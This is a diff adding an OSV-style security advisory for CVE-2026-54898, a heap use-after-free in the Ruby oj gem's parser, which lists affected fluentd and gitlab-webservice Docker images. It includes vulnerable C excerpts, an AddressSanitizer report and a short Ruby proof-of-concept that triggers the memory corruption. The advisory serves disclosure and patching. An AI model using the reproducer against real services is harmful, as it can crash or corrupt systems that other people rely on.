@@ -1,0 +1,104 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-35sl-u2rq-ilpg-pbqk",
+  "modified": "2026-09-21T12:23:37Z",
+  "published": "2026-09-21T12:23:37Z",
+  "upstream": [
+    "CVE-2026-54898"
+  ],
+  "summary": "### Summary",
+  "details": "### Summary\n\n`Oj::Parser#parse` is vulnerable to a heap use-after-free when a SAJ/SAJ2 callback mutates the input JSON string during parsing. The C engine holds a raw `const byte *` pointer into the Ruby string's internal buffer. If a callback (e.g. `hash_start`) resizes the string — for example by calling `String#replace` with a longer value — Ruby reallocates the string buffer and frees the old one. The C parser's pointer is left dangling; the next character read at `parser.c:607` is a use-after-free.\n\n### Version\n\n- **Software**: oj gem\n- **Affected**: all versions with `ext/oj/parser.c`\n- **Latest tested**: 3.17.1 (confirmed present)\n\n### Details\n\n`ext/oj/parser.c`, `parser_parse` → `parse`:\n\n```c\nstatic VALUE parser_parse(VALUE self, VALUE json) {\n    const byte *ptr = (const byte *)StringValuePtr(json);  // raw pointer into Ruby string\n    // ...\n    parse(p, ptr);   // ptr used throughout; any realloc frees the backing buffer\n}\n```\n\n```c\n// parser.c:607\nstatic void parse(ojParser p, const byte *json) {\n    const byte *b = json;\n    // ...\n    for (; '\\0' != *b; b++) {   // ← UAF: reads freed memory after callback resizes json\n```\n\nRuby's `String#replace` (or `<<`, `gsub!`, etc.) can trigger a reallocation of the string's internal buffer if the new content is larger than the embedded capacity, freeing the old buffer that `ptr` still points to.\n\nASAN report:\n```\n==372273==ERROR: AddressSanitizer: heap-use-after-free on address 0x51900008ed81\nREAD of size 1 at 0x51900008ed81 thread T0\n    #0 parse          /ext/oj/parser.c:607\n    #1 parser_parse   /ext/oj/parser.c:1408\n0x51900008ed81 is located 1 bytes inside of 1023-byte region [0x51900008ed80, 0x51900008f17f)\nfreed by thread T0 here:\n    #0 free\n    #1 ruby_sized_xfree  (libruby-3.3.so.3.3)\nShadow bytes: [fd]fd fd fd fd fd ...  (entire region freed)\n```\n\n### Reproduce\n\n```ruby\nrequire 'oj'\n\nclass Mutator\n  def initialize(json) = (@json = json; @done = false)\n\n  def hash_start(key)\n    return if @done; @done = true\n    @json.replace('x' * 1_000_000)   # triggers String realloc, frees original buffer\n  end\n\n  def hash_end(key); end\n  def array_start(key); end\n  def array_end(key); end\n  def add_value(value, key); end\nend\n\njson = '{\"a\":1,\"pad\":\"' + ('A' * 1000) + '\",\"z\":2}'\nparser = Oj::Parser.new(:saj)\nparser.handler = Mutator.new(json)\nparser.parse(json)\n```",
+  "severity": [
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "fluentd",
+        "purl": "pkg:docker/dhi/fluentd?os_name=debian&os_version=12"
+      },
+      "versions": [
+        "1.18.0-debian12",
+        "1.18.0-dev-debian12-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "fluentd",
+        "purl": "pkg:docker/dhi/fluentd?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "1.18.0-debian13",
+        "1.18.0-dev-debian13-dev",
+        "1.19.0-debian13",
+        "1.19.0-debian13-dev",
+        "1.19.0-dev-debian13-dev",
+        "1.19.1-debian13",
+        "1.19.1-debian13-dev",
+        "1.19.2-debian13",
+        "1.19.2-debian13-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images",
+        "name": "gitlab-webservice",
+        "purl": "pkg:docker/dhi/gitlab-webservice?os_name=debian&os_version=13"
+      },
+      "versions": [
+        "18.11.1-debian13",
+        "18.11.1-debian13-dev",
+        "18.11.1-debian13-fips",
+        "18.11.1-debian13-fips-dev",
+        "18.11.3-debian13",
+        "18.11.3-debian13-dev",
+        "18.11.3-debian13-fips",
+        "18.11.3-debian13-fips-dev",
+        "18.11.4-debian13",
+        "18.11.4-debian13-dev",
+        "18.11.4-debian13-fips",
+        "18.11.4-debian13-fips-dev"
+      ],
+      "database_specific": {
+        "owner_kind": "IMAGE"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-35sl-u2rq-ilpg-pbqk"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-q2gm-54r6-8fwm"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/ohler55/oj/security/advisories/GHSA-q2gm-54r6-8fwm"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://security-tracker.debian.org/tracker/CVE-2026-54898"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://ubuntu.com/security/CVE-2026-54898"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://people.ubuntu.com/~ubuntu-security/cve/CVE-2026-54898"
+    }
+  ]
+}
